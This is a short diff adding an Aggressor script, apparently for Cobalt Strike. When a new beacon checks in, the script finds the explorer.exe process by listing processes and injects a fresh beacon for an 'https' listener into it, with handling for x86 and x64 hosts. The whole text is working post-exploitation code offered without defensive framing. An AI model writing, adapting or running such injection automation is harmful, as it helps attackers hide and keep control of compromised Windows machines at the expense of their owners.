@@ -1,0 +1,26 @@
+on beacon_initial
+{
+sub callback
+{
+  $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+  $listener = "https";
+  if ($2  ismatch $regex)
+  {
+   $pid = matched()[1];
+   $inject_pid = $pid;
+   if (-is64 $1)
+   {
+    $arch = "x64";
+   }
+   else
+   {
+    $arch = "x86";
+   }
+   binject($1, $pid, $listener, $arch);
+  }
+}
+if($inject_pid != beacon_info($1,"pid"))
+{
+  bps($1, &callback);
+}
+}
